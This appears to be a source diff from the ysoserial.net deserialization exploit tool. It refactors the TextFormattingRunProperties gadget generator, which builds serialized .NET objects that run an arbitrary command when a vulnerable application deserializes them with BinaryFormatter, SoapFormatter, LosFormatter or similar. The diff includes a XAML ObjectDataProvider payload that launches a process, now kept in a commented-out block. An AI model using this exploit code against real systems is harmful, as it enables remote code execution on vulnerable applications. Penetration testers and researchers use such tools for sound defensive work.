@@ -2,6 +2,7 @@
 using System.Runtime.Serialization;
 using System.Collections.Generic;
 using Microsoft.VisualStudio.Text.Formatting;
+using ysoserial.Helpers;
 
 namespace ysoserial.Generators
 {
@@ -38,9 +39,14 @@ namespace ysoserial.Generators
             return "TextFormattingRunProperties gadget";
         }
 
-        public override string Credit()
+        public override string Finders()
         {
             return "Oleksandr Mirosh and Alvaro Munoz";
+        }
+
+        public override List<string> Labels()
+        {
+            return new List<string> { GadgetTypes.NotBridgeButDervied };
         }
 
         public override List<string> SupportedFormatters()
@@ -48,13 +54,16 @@ namespace ysoserial.Generators
             return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
         }
 
-        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify)
+        public override object Generate(string formatter, InputArgs inputArgs)
         {
+            // commented for future reference (research purposes)
+            /*
             Boolean hasArgs;
             string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);
-
+            
             String cmdPart;
 
+            
             if (hasArgs)
             {
                 cmdPart = $@"<System:String>"+ splittedCMD[0] + @"</System:String>
@@ -64,6 +73,7 @@ namespace ysoserial.Generators
             {
                 cmdPart = $@"<System:String>" + splittedCMD[0] + @"</System:String>";
             }
+
 
             string xaml_payload = @"<ResourceDictionary
   xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
@@ -76,15 +86,56 @@ namespace ysoserial.Generators
      </ObjectDataProvider.MethodParameters>
     </ObjectDataProvider>
 </ResourceDictionary>";
+            
 
-            if (minify)
+            // This is a little bit shorter to use startinfo
+            if (hasArgs)
             {
-                xaml_payload = Helpers.XMLMinifier.Minify(xaml_payload, null, null);
+                cmdPart = $@"<ProcessStartInfo FileName=""" + splittedCMD[0] + @""" Arguments=""" + splittedCMD[1] + @"""/>";
+            }
+            else
+            {
+                cmdPart = $@"<ProcessStartInfo FileName=""" + splittedCMD[0] + @"""/>";
+            }
+
+            string xaml_payload = @"<ResourceDictionary
+  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
+  xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
+>
+	 <ObjectDataProvider x:Key="""" MethodName=""Start"">
+     <ObjectDataProvider.ObjectInstance>
+        <Process xmlns=""clr-namespace:System.Diagnostics;assembly=system"">
+            <Process.StartInfo>" + cmdPart + @"</Process.StartInfo>
+        </Process>
+     </ObjectDataProvider.ObjectInstance>
+    </ObjectDataProvider>
+</ResourceDictionary>";
+            */
+            return Serialize(TextFormattingRunPropertiesGadget(inputArgs), formatter, inputArgs);
+        }
+
+        /* this can be used easily by the plugins as well */
+
+        // This is for those plugins that only accepts cmd and do not want to use any of the input argument features such as minification
+        public static object TextFormattingRunPropertiesGadget(string cmd)
+        {
+            InputArgs inputArgs = new InputArgs();
+            inputArgs.CmdFullString = cmd;
+            return TextFormattingRunPropertiesGadget(inputArgs);
+        }
+
+        public static object TextFormattingRunPropertiesGadget(InputArgs inputArgs)
+        {
+            ObjectDataProviderGenerator myObjectDataProviderGenerator = new ObjectDataProviderGenerator();
+            string xaml_payload = myObjectDataProviderGenerator.GenerateWithNoTest("xaml", inputArgs).ToString();
+
+            if (inputArgs.Minify)
+            {
+                xaml_payload = XMLMinifier.Minify(xaml_payload, null, null);
             }
 
             TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
-            return Serialize(payload, formatter, test, minify);
+            return payload;
         }
-
     }
 }
